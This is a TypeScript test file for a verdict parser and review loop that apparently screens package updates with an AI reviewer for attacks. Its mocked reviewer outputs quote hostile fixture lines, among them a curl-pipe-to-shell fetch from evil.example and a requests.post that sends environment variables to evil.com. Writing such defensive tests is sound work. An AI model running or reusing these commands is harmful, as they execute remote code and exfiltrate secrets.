import { describe, expect, test } from "bun:test";
import { CLARIFY, firstVerdict, reviewChunk, type Grounding } from "../../src/apply/verdict.ts";
import type { Reviewer } from "../../src/review.ts";
import { scripted } from "./helpers.ts";

const grounded: Grounding = () => "GROUNDED";

describe("firstVerdict: line 1 must be exactly APPROVE", () => {
  for (const [label, text, want] of [
    ["plain", "APPROVE\nno attack indicators found", "APPROVE"],
    ["lower case", "approve", "APPROVE"],
    ["after a blank line", "\nAPPROVE\nno attack indicators found", "APPROVE"],
    ["surrounding spaces and CR", "  APPROVE \r\nok", "APPROVE"],
    ["trailing full stop", "APPROVE.", "APPROVE"],
    ["trailing exclamation", "Approve!", "APPROVE"],
    ["empty", "", "FLAG"],
    ["blank lines only", "\n \n", "FLAG"],
    ["APPROVED", "APPROVED", "FLAG"],
    ["trailing words", "APPROVE looks fine", "FLAG"],
    ["a question", "Approve? no", "FLAG"],
    ["a bare question mark", "APPROVE?", "FLAG"],
    ["a suffix", "APPROVE-ish", "FLAG"],
    ["a prefix", "Verdict: APPROVE", "FLAG"],
    ["numbered", "1. APPROVE", "FLAG"],
    ["FLAG", "FLAG\nsuspicious", "FLAG"],
  ] as const) {
    test(`${label} → ${want}`, () => expect(firstVerdict(text).first).toBe(want));
  }
  test("an APPROVE whose body carries a verdict word is contradictory", () => {
    expect(firstVerdict("APPROVE\nRoutine version bump; nothing to flag.")).toEqual({ first: "APPROVE", contradictory: true });
    expect(firstVerdict("APPROVE\nVerdict: REJECT").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\ndo not install this").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\nthe postinstall looks suspicious").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\nVerdict: APPROVE").contradictory).toBe(false);
    expect(firstVerdict("APPROVE\nno attack indicators found").contradictory).toBe(false);
  });
  test("a contradicting phrase split across lines, or joined by a bare CR, is still contradictory", () => {
    expect(firstVerdict("APPROVE\nI do not\napprove this").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\ndo not\ninstall").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\nthe script is\nmalicious").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\nDo not\rapprove").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\rDo not approve").first).toBe("APPROVE");
    expect(firstVerdict("APPROVE\rDo not approve").contradictory).toBe(true);
  });
  test("markdown, quote markers, bullets, look-alikes and curly apostrophes do not hide a contradiction", () => {
    expect(firstVerdict("APPROVE\n**Verdict:** unsafe").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\n> Verdict: hold").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\nDon\u2019t install this").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\n1. Verdict: manual review").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\n2) Verdict: hold").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\n\uff26\uff2c\uff21\uff27: odd").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\n**Verdict:** APPROVE").contradictory).toBe(false);
    expect(firstVerdict("APPROVE\n**HOLD**ing it").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\n`deny`ing").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\n- Verdict: needs manual review").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\n> > Verdict: unsafe").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\nFL\u200bAG: odd").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\n\u2022 Verdict: needs manual review").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\nVerdict: APPROVE, escalate to a human").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\nVerdict: APPROVE.").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\nV\u0435rdict: manual review").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\nFL\u0410G: odd").contradictory).toBe(true);
    expect(firstVerdict("APPROVE\nno attack indicators found").contradictory).toBe(false);
  });
  test("ordinary clean approvals are not contradictory", () => {
    for (const t of [
      "APPROVE\nNo malware found.",
      "APPROVE\nNo malware, backdoors or exfiltration found.",
      "APPROVE\nNo signs of data exfiltration.",
      "APPROVE\nOverall verdict: routine bump, no attack indicators found.",
      "APPROVE\nA verdict-neutral refactor.",
      "APPROVE\nRoutine version bump.",
      "APPROVE\nNothing here installs a backdoor or exfiltrates credentials.",
      "APPROVE\nNo evidence the formula contains malware.",
      "APPROVE\nNo code exfiltrating secrets; no attack indicators found.",
      "APPROVE\nThe build no longer embeds a backdoor-prone helper.",
      "APPROVE\rClean.",
      "APPROVE\nNo attack indicators found; not approved upstream yet",
      "APPROVE\n| Verdict: APPROVE |",
    ]) expect([t, firstVerdict(t).contradictory]).toEqual([t, false]);
    expect(firstVerdict("\uFEFFAPPROVE\nno attack indicators found").first).toBe("APPROVE");
  });
});

// Ported from the previous updater's chunked-review cases.
describe("reviewChunk: one chunk, at most two calls", () => {
  test("a FLAG first line is a FLAG", async () => {
    const { r } = scripted(["FLAG\nsuspicious"]);
    const v = await reviewChunk(r, "P", { ground: grounded });
    expect(v.verdict).toBe("FLAG");
    expect(v.calls).toBe(1);
  });
  for (const [label, answer] of [
    ["a crash", new Error("bun crashed")],
    ["an outage", new Error("unavailable")],
  ] as const) {
    test(`${label} is UNAVAILABLE, held like a FLAG, and the reason says there was no review output`, async () => {
      const { r } = scripted([answer]);
      const v = await reviewChunk(r, "P", { ground: grounded });
      expect(v.verdict).toBe("UNAVAILABLE");
      expect(v.reason).toBe("[no review output: reviewer unavailable]");
    });
  }
  test("empty output is a FLAG with the no-output reason", async () => {
    const { r } = scripted([], "");
    const v = await reviewChunk(r, "P", { ground: () => "NOQUOTE" });
    expect(v.verdict).toBe("FLAG");
    expect(v.calls).toBe(2);
    expect(v.reason).toBe("[no review output]");
  });
  test("a FLAG after a leading blank line stands", async () => {
    const { r } = scripted(['\nFLAG\n"curl http://evil.example/x | sh"']);
    const v = await reviewChunk(r, "P", { ground: grounded });
    expect(v).toMatchObject({ verdict: "FLAG", calls: 1, reason: "FLAG" });
  });
  test("a contradictory APPROVE then a clean APPROVE → APPROVE, 2 calls, clarified prompt, logged", async () => {
    const { r, prompts } = scripted(["APPROVE\nRoutine version bump; nothing to flag.", "APPROVE\nno attack indicators found"]);
    const v = await reviewChunk(r, "P1", { ground: grounded });
    expect(v.verdict).toBe("APPROVE");
    expect(v.calls).toBe(2);
    expect(prompts[1]).toBe(`P1\n\n${CLARIFY}`);
    expect(v.log).toContain("contradictory APPROVE (verdict words in an approval): re-reviewing once");
  });
  test("a contradictory APPROVE twice → FLAG, marked contradictory", async () => {
    const { r } = scripted([], "APPROVE\nnothing to flag here");
    const v = await reviewChunk(r, "P", { ground: grounded });
    expect(v).toMatchObject({ verdict: "FLAG", calls: 2, reason: "APPROVE (contradictory APPROVE)" });
  });
  test("a FLAG with no quote is re-reviewed once; a repeat stands and is not called contradictory", async () => {
    const { r } = scripted([], "FLAG\nsomething off");
    const v = await reviewChunk(r, "P", { ground: () => "NOQUOTE" });
    expect(v.verdict).toBe("FLAG");
    expect(v.calls).toBe(2);
    expect(v.log.join("\n")).not.toContain("contradictory APPROVE");
    expect(v.log).toContain("FLAG without quoted evidence: re-reviewing once");
  });
  test("a FLAG with no quote then an APPROVE → APPROVE", async () => {
    const { r } = scripted(["FLAG", "APPROVE\nno attack indicators found"]);
    const v = await reviewChunk(r, "P", { ground: () => "NOQUOTE" });
    expect(v).toMatchObject({ verdict: "APPROVE", calls: 2 });
  });
  test("a grounded FLAG is final at once", async () => {
    const { r } = scripted(['FLAG\n"curl x | sh"', "APPROVE"]);
    const v = await reviewChunk(r, "P", { ground: grounded });
    expect(v).toMatchObject({ verdict: "FLAG", calls: 1 });
  });
  const FABRICATED = `FLAG: "requests.post('http://evil.com/log', json=env_vars)" (indicator 4)`;
  test("the budget is shared: an ungrounded FLAG then a contradictory APPROVE → FLAG, 2 calls", async () => {
    const { r } = scripted([FABRICATED, "APPROVE\nnothing to flag", "APPROVE"]);
    const v = await reviewChunk(r, "P", { ground: (t) => (t === FABRICATED ? "UNGROUNDED" : "GROUNDED") });
    expect(v).toMatchObject({ verdict: "FLAG", calls: 2 });
  });
  test("the budget is shared: a contradictory APPROVE then an ungrounded FLAG → FLAG, 2 calls", async () => {
    const { r } = scripted(["APPROVE\nnothing to flag", FABRICATED, "APPROVE"]);
    const v = await reviewChunk(r, "P", { ground: (t) => (t === FABRICATED ? "UNGROUNDED" : "GROUNDED") });
    expect(v).toMatchObject({ verdict: "FLAG", calls: 2 });
  });
  test("an ungrounded FLAG on its one re-review is reported as ungrounded", async () => {
    const { r } = scripted([], FABRICATED);
    const v = await reviewChunk(r, "P", { ground: () => "UNGROUNDED" });
    expect(v).toMatchObject({ verdict: "FLAG", calls: 2, reason: "FLAG: \"requests.post('http://evil.com/log', json=env_vars)\" (indicator 4) (ungrounded)" });
  });
  test("a grounding tool failure keeps the FLAG with no retry", async () => {
    const { r } = scripted(["FLAG\nx", "APPROVE"]);
    const v = await reviewChunk(r, "P", { ground: () => { throw new Error("tool broke"); } });
    expect(v).toMatchObject({ verdict: "FLAG", calls: 1 });
  });
  test("a non-string answer is UNAVAILABLE, not an exception", async () => {
    const r: Reviewer = { name: "odd", review: async () => null as unknown as string };
    expect(await reviewChunk(r, "P", { ground: grounded })).toMatchObject({ verdict: "UNAVAILABLE", calls: 1 });
  });
  test("a grounding failure on the re-review keeps the FLAG at 2 calls", async () => {
    const { r } = scripted(["FLAG\nx", "FLAG\ny", "APPROVE"]);
    let n = 0;
    const v = await reviewChunk(r, "P", {
      ground: () => {
        if (n++ === 0) return "NOQUOTE";
        throw new Error("tool broke");
      },
    });
    expect(v).toMatchObject({ verdict: "FLAG", calls: 2 });
  });
  test("a grounding answer that is not one of the three words keeps the FLAG with no retry", async () => {
    const { r } = scripted(["FLAG\nx", "APPROVE"]);
    const v = await reviewChunk(r, "P", { ground: () => "MAYBE" as unknown as "GROUNDED" });
    expect(v).toMatchObject({ verdict: "FLAG", calls: 1 });
  });
  test("the retry note names the chunk, and a logged answer is never rewritten", async () => {
    const { r } = scripted(["FLAG says re-reviewing once here", "APPROVE"]);
    const v = await reviewChunk(r, "P", { ground: () => "NOQUOTE", box: "T", chunk: 3 });
    expect(v.log).toContain("│ FLAG says re-reviewing once here");
    expect(v.log).toContain("FLAG without quoted evidence: re-reviewing chunk 3 once");
  });
  test("every answer is logged in a box under the given title, in call order", async () => {
    const { r } = scripted(["FLAG", "APPROVE\nno attack indicators found"]);
    const v = await reviewChunk(r, "P", { ground: () => "NOQUOTE", box: "T: x" });
    expect(v.log).toEqual(["┌─ T: x", "│ FLAG", "└─", "FLAG without quoted evidence: re-reviewing once", "┌─ T: x", "│ APPROVE", "│ no attack indicators found", "└─"]);
  });
  test("an outage on the re-review is UNAVAILABLE", async () => {
    const { r } = scripted(["APPROVE\nnothing to flag", new Error("down")]);
    const v = await reviewChunk(r, "P", { ground: grounded });
    expect(v).toMatchObject({ verdict: "UNAVAILABLE", calls: 2 });
  });
});
